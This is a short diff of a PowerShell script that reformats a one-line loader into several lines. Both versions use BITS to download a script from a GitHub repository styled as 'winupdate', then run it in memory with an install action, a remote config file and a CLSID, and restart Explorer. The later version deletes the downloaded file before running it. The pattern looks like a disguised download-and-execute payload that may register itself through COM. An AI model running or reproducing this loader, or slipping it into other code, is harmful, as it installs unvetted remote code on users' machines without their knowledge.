@@ -1,1 +1,5 @@
-$t=[System.IO.Path]::GetTempFileName();Start-BitsTransfer -Source "https://raw.githubusercontent.com/pty-ui/winupdate/refs/heads/main/cn.txt" -Dest $t; & ([scriptblock]::Create((Get-Content $t -Raw))) -Action Install -Config "https://raw.githubusercontent.com/pty-ui/winupdate/refs/heads/main/conf.cfg" -Clsid '{578480AA-1B1C-4343-AABD-62C0A273DCB5}' -RestartExplorer;Remove-Item $t
+$tempFile = [System.IO.Path]::GetTempFileName()
+Start-BitsTransfer -Source "https://raw.githubusercontent.com/pty-ui/winupdate/refs/heads/main/cn.txt" -Destination $tempFile -TransferType Download
+$scriptContent = Get-Content $tempFile -Raw
+Remove-Item $tempFile
+& ([scriptblock]::Create($scriptContent)) -Action Install -Config "https://raw.githubusercontent.com/pty-ui/winupdate/refs/heads/main/conf.cfg" -Clsid '{578480AA-1B1C-4343-AABD-62C0A273DCB5}' -RestartExplorer
